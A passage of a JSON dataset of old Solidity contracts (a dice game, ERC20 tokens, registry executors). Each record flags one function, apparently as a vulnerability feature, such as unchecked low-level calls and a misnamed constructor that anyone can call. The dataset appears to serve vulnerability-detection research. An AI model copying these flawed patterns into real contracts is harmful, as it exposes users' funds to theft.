profitDistributed;\n }\n function isWinningBet(Bet thisBet, uint numberRolled)\n private\n onlyWinningBets(numberRolled) {\n uint winAmount = (thisBet.amountBet * (10000 - edge)) / pwin;\n LOG_BetWon(thisBet.playerAddress, numberRolled, winAmount);\n safeSend(thisBet.playerAddress, winAmount);\n totalWin += winAmount - thisBet.amountBet;\n if ((investorsLosses + winAmount < investorsLosses) ||\n (investorsLosses + winAmount < thisBet.amountBet)) {\n throw;\n }\n investorsLosses += winAmount - thisBet.amountBet;\n }\n function isLosingBet(Bet thisBet, uint numberRolled)\n private\n onlyLosingBets(numberRolled) {\n LOG_BetLost(thisBet.playerAddress, numberRolled);\n safeSend(thisBet.playerAddress, 1);\n if ((investorsProfit + thisBet.amountBet < investorsProfit) ||\n (investorsProfit + thisBet.amountBet < thisBet.amountBet) ||\n (thisBet.amountBet == 1)) {\n throw;\n }\n uint totalProfit = investorsProfit + (thisBet.amountBet - 1);\n investorsProfit += (thisBet.amountBet - 1)*(10000 - houseEdge)/10000;\n uint houseProfit = totalProfit - investorsProfit;\n safeSend(houseAddress, houseProfit);\n }\n function increaseInvestment()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyInvestors {\n profitDistribution();\n investors[investorIDs[msg.sender]].amountInvested += msg.value;\n invested += msg.value;\n }\n function newInvestor()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyNotInvestors\n onlyMoreThanMinInvestment\n investorsInvariant {\n profitDistribution();\n if (numInvestors == maxInvestors) {\n uint smallestInvestorID = searchSmallestInvestor();\n divest(investors[smallestInvestorID].investorAddress);\n }\n numInvestors++;\n addInvestorAtID(numInvestors);\n }\n function divest()\n onlyInvestors {\n divest(msg.sender);\n }\n function divest(address currentInvestor)\n private\n investorsInvariant {\n profitDistribution();\n uint currentID = investorIDs[currentInvestor];\n uint amountToReturn = getBalance(currentInvestor);\n if ((invested >= investors[currentID].amountInvested)) {\n invested -= investors[currentID].amountInvested;\n uint divestFeeAmount = (amountToReturn*divestFee)/10000;\n amountToReturn -= divestFeeAmount;\n delete investors[currentID];\n delete investorIDs[currentInvestor];\n if (currentID != numInvestors) {\n Investor lastInvestor = investors[numInvestors];\n investorIDs[lastInvestor.investorAddress] = currentID;\n investors[currentID] = lastInvestor;\n delete investors[numInvestors];\n }\n numInvestors--;\n safeSend(currentInvestor, amountToReturn);\n safeSend(houseAddress, divestFeeAmount);\n LOG_InvestorExit(currentInvestor, amountToReturn);\n } else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n }\n function forceDivestOfAllInvestors()\n onlyOwner {\n uint copyNumInvestors = numInvestors;\n for (uint i = 1; i <= copyNumInvestors; i++) {\n divest(investors[1].investorAddress);\n }\n }\n function forceDivestOfOneInvestor(address currentInvestor)\n onlyOwner\n onlyIfStopped {\n divest(currentInvestor);\n delete proposedWithdrawal;\n }\n function stopContract()\n onlyOwner {\n isStopped = true;\n LOG_ContractStopped();\n }\n function resumeContract()\n onlyOwner {\n isStopped = false;\n LOG_ContractResumed();\n }\n function changeHouseAddress(address newHouse)\n onlyOwner {\n if (newHouse == address(0x0)) throw;\n houseAddress = newHouse;\n LOG_HouseAddressChanged(houseAddress, newHouse);\n }\n function changeRandomOrgAPIKey(string newKey)\n onlyOwner {\n string oldKey = randomOrgAPIKey;\n randomOrgAPIKey = newKey;\n LOG_RandomOrgAPIKeyChanged(oldKey, newKey);\n }\n function changeOwnerAddress(address newOwner)\n onlyOwner {\n if (newOwner == address(0x0)) throw;\n owner = newOwner;\n LOG_OwnerAddressChanged(owner, newOwner);\n }\n function changeGasLimitOfSafeSend(uint newGasLimit)\n onlyOwner\n onlyIfValidGas(newGasLimit) {\n safeGas = newGasLimit;\n LOG_GasLimitChanged(safeGas, newGasLimit);\n }\n function voteEmergencyWithdrawal(bool vote)\n onlyInvestors\n onlyAfterProposed\n onlyIfStopped {\n investors[investorIDs[msg.sender]].votedForEmergencyWithdrawal = vote;\n LOG_EmergencyWithdrawalVote(msg.sender, vote);\n }\n function proposeEmergencyWithdrawal(address withdrawalAddress)\n onlyIfStopped\n onlyOwner {\n for (uint i = 1; i <= numInvestors; i++) {\n delete investors[i].votedForEmergencyWithdrawal;\n }\n proposedWithdrawal = WithdrawalProposal(withdrawalAddress, now);\n LOG_EmergencyWithdrawalProposed();\n }\n function executeEmergencyWithdrawal()\n onlyOwner\n onlyAfterProposed\n onlyIfStopped\n onlyIfEmergencyTimeOutHasPassed {\n uint numOfVotesInFavour;\n uint amountToWithdraw = this.balance;\n for (uint i = 1; i <= numInvestors; i++) {\n if (investors[i].votedForEmergencyWithdrawal == true) {\n numOfVotesInFavour++;\n delete investors[i].votedForEmergencyWithdrawal;\n }\n }\n if (numOfVotesInFavour >= emergencyWithdrawalRatio * numInvestors / 100) {\n if (!proposedWithdrawal.toAddress.send(amountToWithdraw)) {\n LOG_EmergencyWithdrawalFailed(proposedWithdrawal.toAddress);\n }\n else {\n LOG_EmergencyWithdrawalSucceeded(proposedWithdrawal.toAddress, amountToWithdraw);\n }\n }\n else {\n throw;\n }\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1671"
  },
  "filename": "78.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function safeSub(uint256 a, uint256 b) internal returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function burn(uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed burner, uint256 value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function burn(uint256 _value) returns (bool success) {\n if (balances[msg.sender] < _value) throw;\n if (_value <= 0) throw;\n balances[msg.sender] = Token.safeSub(balances[msg.sender], _value);\n totalSupply = Token.safeSub(totalSupply,_value);\n Burn(msg.sender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract OodlebitToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function OodlebitToken(\n ) {\n balances[msg.sender] = 200000000000000000000000000;\n totalSupply = 200000000000000000000000000;\n name = \"OODL\";\n decimals = 18;\n symbol = \"OODL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1672"
  },
  "filename": "791.sol",
  "content": "pragma solidity ^0.4.2;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1673"
  },
  "filename": "8.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token{\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns\n (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256\n _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract TokenGreeneum is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function TokenGreeneum(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1674"
  },
  "filename": "844.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Updater\n{\n mapping (address => bool) public owners;\n struct State {\n bool exchange;\n bool payment;\n }\n mapping(address => State) public states;\n event InfoUpdated(bytes4 indexed method, address indexed target, bool indexed res, uint256 ETHUSD, uint256 token, uint256 value);\n event OwnerChanged(address indexed previousOwner, bool state);\n modifier onlyOwner() {\n require(owners[msg.sender]);\n _;\n }\n function Updater() public {\n owners[msg.sender] = true;\n }\n function setOwner(address _newOwner,bool _state) onlyOwner public {\n emit OwnerChanged(_newOwner, _state);\n owners[_newOwner] = _state;\n }\n function setStates(address[] _addr, uint8[] _exchange, uint8[] _payment) onlyOwner public {\n for(uint256 i = 0; i < _addr.length; i++){\n states[_addr[i]].exchange = _exchange[i]>0;\n states[_addr[i]].payment = _payment[i]>0;\n }\n }\n function update(address[] _addr, uint256[] _ETHUSD, uint256[] _token, uint256[] _value) onlyOwner public {\n for(uint256 i = 0; i < _addr.length; i++){\n State storage state = states[_addr[i]];\n bool res;\n if(!(state.exchange || state.payment)){\n res=_addr[i].call(bytes4(keccak256(\"updateInfo(uint256,uint256,uint256)\")),_ETHUSD[i],_token[i],_value[i]);\n emit InfoUpdated(bytes4(keccak256(\"updateInfo(uint256,uint256,uint256)\")),_addr[i],res,_ETHUSD[i],_token[i],_value[i]);\n continue;\n }\n if(state.exchange){\n res=_addr[i].call(bytes4(keccak256(\"changeExchange(uint256)\")),_ETHUSD[i]);\n emit InfoUpdated(bytes4(keccak256(\"changeExchange(uint256)\")),_addr[i],res,_ETHUSD[i],0x0,0x0);\n }\n if(state.payment){\n res=_addr[i].call(bytes4(keccak256(\"paymentsInOtherCurrency(uint256,uint256)\")),_token[i],_value[i]);\n emit InfoUpdated(bytes4(keccak256(\"paymentsInOtherCurrency(uint256,uint256)\")),_addr[i],res,0x0,_token[i],_value[i]);\n }\n }\n }\n}",
  "extract_feature": [
    "function update(address[] _addr, uint256[] _ETHUSD, uint256[] _token, uint256[] _value) onlyOwner public {\nfor(uint256 i = 0; i < _addr.length; i++){\nState storage state = states[_addr[i]];\nbool res;\nif(!(state.exchange || state.payment)){\nres=_addr[i].call(bytes4(keccak256(\"updateInfo(uint256,uint256,uint256)\")),_ETHUSD[i],_token[i],_value[i]);\nemit InfoUpdated(bytes4(keccak256(\"updateInfo(uint256,uint256,uint256)\")),_addr[i],res,_ETHUSD[i],_token[i],_value[i]);\ncontinue;\n}\nif(state.exchange){\nres=_addr[i].call(bytes4(keccak256(\"changeExchange(uint256)\")),_ETHUSD[i]);\nemit InfoUpdated(bytes4(keccak256(\"changeExchange(uint256)\")),_addr[i],res,_ETHUSD[i],0x0,0x0);\n}\nif(state.payment){\nres=_addr[i].call(bytes4(keccak256(\"paymentsInOtherCurrency(uint256,uint256)\")),_token[i],_value[i]);\nemit InfoUpdated(bytes4(keccak256(\"paymentsInOtherCurrency(uint256,uint256)\")),_addr[i],res,0x0,_token[i],_value[i]);\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1675"
  },
  "filename": "88.sol",
  "content": "pragma solidity ^0.4.23;\ninterface StorageInterface {\n function getTarget(bytes32 exec_id, bytes4 selector)\n external view returns (address implementation);\n function getIndex(bytes32 exec_id) external view returns (address index);\n function createInstance(address sender, bytes32 app_name, address provider, bytes32 registry_exec_id, bytes calldata)\n external payable returns (bytes32 instance_exec_id, bytes32 version);\n function createRegistry(address index, address implementation) external returns (bytes32 exec_id);\n function exec(address sender, bytes32 exec_id, bytes calldata)\n external payable returns (uint emitted, uint paid, uint stored);\n}\ninterface RegistryInterface {\n function getLatestVersion(address stor_addr, bytes32 exec_id, address provider, bytes32 app_name)\n external view returns (bytes32 latest_name);\n function getVersionImplementation(address stor_addr, bytes32 exec_id, address provider, bytes32 app_name, bytes32 version_name)\n external view returns (address index, bytes4[] selectors, address[] implementations);\n}\ncontract ScriptExec {\n address public app_storage;\n address public provider;\n bytes32 public registry_exec_id;\n address public exec_admin;\n struct Instance {\n address current_provider;\n bytes32 current_registry_exec_id;\n bytes32 app_exec_id;\n bytes32 app_name;\n bytes32 version_name;\n }\n mapping (bytes32 => address) public deployed_by;\n mapping (bytes32 => Instance) public instance_info;\n mapping (address => Instance[]) public deployed_instances;\n mapping (bytes32 => bytes32[]) public app_instances;\n event AppInstanceCreated(address indexed creator, bytes32 indexed execution_id, bytes32 app_name, bytes32 version_name);\n event StorageException(bytes32 indexed execution_id, string message);\n modifier onlyAdmin() {\n require(msg.sender == exec_admin);\n _;\n }\n function () public payable { }\n function configure(address _exec_admin, address _app_storage, address _provider) public {\n require(app_storage == 0, \"ScriptExec already configured\");\n require(_app_storage != 0, 'Invalid input');\n exec_admin = _exec_admin;\n app_storage = _app_storage;\n provider = _provider;\n if (exec_admin == 0)\n exec_admin = msg.sender;\n }\n bytes4 internal constant EXEC_SEL = bytes4(keccak256('exec(address,bytes32,bytes)'));\n function exec(bytes32 _exec_id, bytes _calldata) external payable returns (bool success);\n bytes4 internal constant ERR = bytes4(keccak256('Error(string)'));\n function getAction(uint _ptr) internal pure returns (bytes4 action) {\n assembly {\n action := and(mload(_ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)\n }\n }\n function checkErrors(bytes32 _exec_id) internal {\n string memory message;\n bytes4 err_sel = ERR;\n assembly {\n let ptr := mload(0x40)\n returndatacopy(ptr, 0, returndatasize)\n mstore(0x40, add(ptr, returndatasize))\n if eq(mload(ptr), and(err_sel, 0xffffffff00000000000000000000000000000000000000000000000000000000)) {\n message := add(0x24, ptr)\n }\n }\n if (bytes(message).length == 0)\n emit StorageException(_exec_id, \"No error recieved\");\n else\n emit StorageException(_exec_id, message);\n }\n function checkReturn() internal pure returns (bool success) {\n success = false;\n assembly {\n if eq(returndatasize, 0x60) {\n let ptr := mload(0x40)\n returndatacopy(ptr, 0, returndatasize)\n if iszero(iszero(mload(ptr))) { success := 1 }\n if iszero(iszero(mload(add(0x20, ptr)))) { success := 1 }\n if iszero(iszero(mload(add(0x40, ptr)))) { success := 1 }\n }\n }\n return success;\n }\n function createAppInstance(bytes32 _app_name, bytes _init_calldata) external returns (bytes32 exec_id, bytes32 version) {\n require(_app_name != 0 && _init_calldata.length >= 4, 'invalid input');\n (exec_id, version) = StorageInterface(app_storage).createInstance(\n msg.sender, _app_name, provider, registry_exec_id, _init_calldata\n );\n deployed_by[exec_id] = msg.sender;\n app_instances[_app_name].push(exec_id);\n Instance memory inst = Instance(\n provider, registry_exec_id, exec_id, _app_name, version\n );\n instance_info[exec_id] = inst;\n deployed_instances[msg.sender].push(inst);\n emit AppInstanceCreated(msg.sender, exec_id, _app_name, version);\n }\n function setRegistryExecID(bytes32 _exec_id) public onlyAdmin() {\n registry_exec_id = _exec_id;\n }\n function setProvider(address _provider) public onlyAdmin() {\n provider = _provider;\n }\n function setAdmin(address _admin) public onlyAdmin() {\n require(_admin != 0);\n exec_admin = _admin;\n }\n function getInstances(bytes32 _app_name) public view returns (bytes32[] memory) {\n return app_instances[_app_name];\n }\n function getDeployedLength(address _deployer) public view returns (uint) {\n return deployed_instances[_deployer].length;\n }\n bytes4 internal constant REGISTER_APP_SEL = bytes4(keccak256('registerApp(bytes32,address,bytes4[],address[])'));\n function getRegistryImplementation() public view returns (address index, address implementation) {\n index = StorageInterface(app_storage).getIndex(registry_exec_id);\n implementation = StorageInterface(app_storage).getTarget(registry_exec_id, REGISTER_APP_SEL);\n }\n function getInstanceImplementation(bytes32 _exec_id) public view\n returns (address index, bytes4[] memory functions, address[] memory implementations) {\n Instance memory app = instance_info[_exec_id];\n index = StorageInterface(app_storage).getIndex(app.current_registry_exec_id);\n (index, functions, implementations) = RegistryInterface(index).getVersionImplementation(\n app_storage, app.current_registry_exec_id, app.current_provider, app.app_name, app.version_name\n );\n }\n}\ncontract RegistryExec is ScriptExec {\n struct Registry {\n address index;\n address implementation;\n }\n mapping (bytes32 => Registry) public registry_instance_info;\n mapping (address => Registry[]) public deployed_registry_instances;\n event RegistryInstanceCreated(address indexed creator, bytes32 indexed execution_id, address index, address implementation);\n bytes4 internal constant EXEC_SEL = bytes4(keccak256('exec(address,bytes32,bytes)'));\n function exec(bytes32 _exec_id, bytes _calldata) external payable returns (bool success) {\n bytes4 sel = getSelector(_calldata);\n require(\n sel != this.registerApp.selector &&\n sel != this.registerAppVersion.selector &&\n sel != UPDATE_INST_SEL &&\n sel != UPDATE_EXEC_SEL\n );\n if (address(app_storage).call.value(msg.value)(abi.encodeWithSelector(\n EXEC_SEL, msg.sender, _exec_id, _calldata\n )) == false) {\n checkErrors(_exec_id);\n address(msg.sender).transfer(address(this).balance);\n return false;\n }\n success = checkReturn();\n require(success, 'Execution failed');\n address(msg.sender).transfer(address(this).balance);\n }\n function getSelector(bytes memory _calldata) internal pure returns (bytes4 selector) {\n assembly {\n selector := and(\n mload(add(0x20, _calldata)),\n 0xffffffff00000000000000000000000000000000000000000000000000000000\n )\n }\n }\n function createRegistryInstance(address _index, address _implementation) external onlyAdmin() returns (bytes32 exec_id) {\n require(_index != 0 && _implementation != 0, 'Invalid input');\n exec_id = StorageInterface(app_storage).createRegistry(_index, _implementation);\n require(exec_id != 0, 'Invalid response from storage');\n if (registry_exec_id == 0)\n registry_exec_id = exec_id;\n Registry memory reg = Registry(_index, _implementation);\n deployed_by[exec_id] = msg.sender;\n registry_instance_info[exec_id] = reg;\n deployed_registry_instances[msg.sender].push(reg);\n emit RegistryInstanceCreated(msg.sender, exec_id, _index, _implementation);\n }\n function registerApp(bytes32 _app_name, address _index, bytes4[] _selectors, address[] _implementations) external onlyAdmin() {\n require(_app_name != 0 && _index != 0, 'Invalid input');\n require(_selectors.length == _implementations.length && _selectors.length != 0, 'Invalid input');\n require(app_storage != 0 && registry_exec_id != 0 && provider != 0, 'Invalid state');\n uint emitted;\n uint paid;\n uint stored;\n (emitted, paid, stored) = StorageInterface(app_storage).exec(msg.sender, registry_exec_id, msg.data);\n require(emitted == 0 && paid == 0 && stored != 0, 'Invalid state change');\n }\n function registerAppVersion(bytes32 _app_name, bytes32 _version_name, address _index, bytes4[] _selectors, address[] _implementations) external onlyAdmin() {\n require(_app_name != 0 && _version_name != 0 && _index != 0, 'Invalid input');\n require(_selectors.length == _implementations.length && _selectors.length != 0, 'Invalid input');\n require(app_storage != 0 && registry_exec_id != 0 && provider != 0, 'Invalid state');\n uint emitted;\n uint paid;\n uint stored;\n (emitted, paid, stored) = StorageInterface(app_storage).exec(msg.sender, registry_exec_id, msg.data);\n require(emitted == 0 && paid == 0 && stored != 0, 'Invalid state change');\n }\n bytes4 internal constant UPDATE_INST_SEL = bytes4(keccak256('updateInstance(bytes32,bytes32,bytes32)'));\n function updateAppInstance(bytes32 _exec_id) external returns (bool success) {\n require(_exec_id != 0 && msg.sender == deployed_by[_exec_id], 'invalid sender or input');\n Instance memory inst = instance_info[_exec_id];\n if(address(app_storage).call(\n abi.encodeWithSelector(EXEC_SEL,\n inst.current_provider,\n _exec_id,\n abi.encodeWithSelector(UPDATE_INST_SEL,\n inst.app_name,\n inst.version_name,\n inst.current_registry_exec_id\n )\n )\n ) == false) {\n checkErrors(_exec_id);\n return false;\n }\n success = checkReturn();\n require(success, 'Execution failed');\n address registry_idx = StorageInterface(app_storage).getIndex(inst.current_registry_exec_id);\n bytes32 latest_version = RegistryInterface(registry_idx).getLatestVersion(\n app_storage,\n inst.current_registry_exec_id,\n inst.current_provider,\n inst.app_name\n );\n require(latest_version != 0, 'invalid latest version');\n instance_info[_exec_id].version_name = latest_version;\n }\n bytes4 internal constant UPDATE_EXEC_SEL = bytes4(keccak256('updateExec(address)'));\n function updateAppExec(bytes32 _exec_id, address _new_exec_addr) external returns (bool success) {\n require(_exec_id != 0 && msg.sender == deployed_by[_exec_id] && address(this) != _new_exec_addr && _new_exec_addr != 0, 'invalid input');\n if(address(app_storage).call(\n abi.encodeWithSelector(EXEC_SEL,\n msg.sender,\n _exec_id,\n abi.encodeWithSelector(UPDATE_EXEC_SEL, _new_exec_addr)\n )\n ) == false) {\n checkErrors(_exec_id);\n return false;\n }\n success = checkReturn();\n require(success, 'Execution failed');\n }\n}",
  "extract_feature": [
    "function updateAppInstance(bytes32 _exec_id) external returns (bool success) {\nrequire(_exec_id != 0 && msg.sender == deployed_by[_exec_id], 'invalid sender or input');\nInstance memory inst = instance_info[_exec_id];\nif(address(app_storage).call(\nabi.encodeWithSelector(EXEC_SEL,\ninst.current_provider,\n_exec_id,\nabi.encodeWithSelector(UPDATE_INST_SEL,\ninst.app_name,\ninst.version_name,\ninst.current_registry_exec_id\n)\n)\n) == false) {\ncheckErrors(_exec_id);\nreturn false;\n}\nsuccess = checkReturn();\nrequire(success, 'Execution failed');\naddress registry_idx = StorageInterface(app_storage).getIndex(inst.current_registry_exec_id);\nbytes32 latest_version = RegistryInterface(registry_idx).getLatestVersion(\napp_storage,\ninst.current_registry_exec_id,\ninst.current_provider,\ninst.app_name\n);\nrequire(latest_version != 0, 'invalid latest version');\ninstance_info[_exec_id].version_name = latest_version;\n}",
    "function updateAppExec(bytes32 _exec_id, address _new_exec_addr) external returns (bool success) {\nrequire(_exec_id != 0 && msg.sender == deployed_by[_exec_id] && address(this) != _new_exec_addr && _new_exec_addr != 0, 'invalid input');\nif(address(app_storage).call(\nabi.encodeWithSelector(EXEC_SEL,\nmsg.sender,\n_exec_id,\nabi.encodeWithSelector(UPDATE_EXEC_SEL, _new_exec_addr)\n)\n) == false) {\ncheckErrors(_exec_id);\nreturn false;\n}\nsuccess = checkReturn();\nrequire(success, 'Execution failed');\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1676"
  },
  "filename": "90.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PKCoin is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function HashnodeTestCoin() {\n balances[msg.sender] = 1000000000000000000000;\n totalSupply = 13520000000;\n name = \"PKCoin\";\n decimals = 18;\n symbol = \"PKCN\";\n unitsOneEthCanBuy = 1000000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n 